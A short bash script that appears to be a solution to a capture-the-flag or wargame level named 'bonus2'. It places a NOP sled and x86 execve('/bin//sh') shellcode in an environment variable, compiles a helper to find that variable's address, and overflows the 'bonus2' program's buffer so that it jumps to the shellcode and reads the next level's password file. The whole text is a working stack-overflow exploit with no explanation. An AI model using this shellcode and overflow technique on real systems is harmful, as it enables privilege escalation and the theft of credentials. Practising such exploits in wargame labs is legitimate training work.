#!/bin/bash
export SHELLCODE=$(python -c 'print "\x90"*8000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
export LANG=nl
cat << EOF > /tmp/find_env_addr2.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  printf("0x%lx\n", getenv("SHELLCODE"));
  return 0;
}
EOF
cc -o /tmp/find_env_addr2 /tmp/find_env_addr2.c 2> /dev/null
A=$(/tmp/find_env_addr2)
echo "cat /home/user/bonus3/.pass" | ~/bonus2 $(python -c 'print "A" *63') $(python -c "import struct; print 23*\"A\" + struct.pack(\"I\", $A) + 34 * \"\x90\"")
